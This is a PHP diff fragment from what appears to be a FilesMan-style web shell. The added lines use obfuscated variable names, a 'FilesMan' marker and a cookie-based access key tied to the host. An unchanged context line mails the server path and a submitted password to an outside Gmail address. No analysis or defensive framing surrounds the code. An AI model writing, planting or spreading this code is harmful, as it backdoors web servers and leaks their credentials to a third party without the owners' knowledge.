@@ -4,6 +4,12 @@ if(array_key_exists('watching',$_POST)){
 	$tmp = $_SERVER['SERVER_NAME'].$_SERVER['PHP_SELF']."\n".$_POST['pass']; @mail('yanitugas12345@gmail.com', 'root', $tmp); // Edit or delete!
 }
 //-----------------Password---------------------
+$▛ = "";
+$▘ = true;
+$▜ = 'UTF-8';
+$▚ = 'FilesMan';
+$▙ = md5($_SERVER['HTTP_USER_AGENT']);
+if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST'])."key"]))
 {
 	prototype(md5($_SERVER['HTTP_HOST'])."key", $▙);
 }
